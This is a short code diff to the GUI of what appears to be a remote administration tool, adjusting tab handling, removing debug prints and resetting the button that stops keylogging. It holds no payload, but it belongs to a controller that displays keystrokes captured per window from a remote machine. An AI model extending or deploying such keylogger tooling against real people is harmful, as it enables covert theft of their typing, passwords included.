@@ -103,12 +103,13 @@ class MainDialog(QWidget, gui.Ui_Form):
     # START: TabWidget functions
 
     # Disable & Enable tabs
-    def tabsDisable(self, state):
+    def tabsDisable(self, state, keylogger=False):
 
         # If state == True disable tabs and change to first tab
         if state:
             self.tabWidget.setDisabled(state)
-            self.tabWidget.setCurrentIndex(0)
+            if not keylogger:
+                self.tabWidget.setCurrentIndex(0)
 
         # if state == False enable tabs
         else:
@@ -210,14 +211,13 @@ class MainDialog(QWidget, gui.Ui_Form):
                 CreateButton(ObjName, title)
 
         if self.activeWindowTitle:
-            print self.KeyStokes[self.BObjects[self.activeWindowTitle]]
             self.keystokesText.setText('<p align="center" style="color:lime; font-size: 12px; background-color:#194759;">%s</font></p><br>'
                                        % self.BObjects[self.activeWindowTitle] + self.KeyStokes[self.BObjects[self.activeWindowTitle]])
 
     def Stoplogging(self):
         self.KeyLoggingState = False
         self.Send('StopLogging')
-        print self.Receive()
+        self.startloggingButton.setChecked(False)
 
     # END: Keylogger
     
